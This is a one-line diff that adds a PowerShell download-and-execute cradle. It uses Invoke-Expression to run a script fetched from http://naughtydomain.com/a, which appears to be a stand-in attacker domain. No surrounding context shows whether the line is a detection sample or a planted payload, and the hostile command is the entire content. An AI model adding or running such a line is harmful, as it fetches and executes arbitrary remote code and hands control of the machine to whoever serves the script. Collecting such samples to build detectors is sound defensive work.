@@ -1,0 +1,1 @@
+IEX (New-Object System.Net.WebClient).downloadstring('http://naughtydomain.com/a')
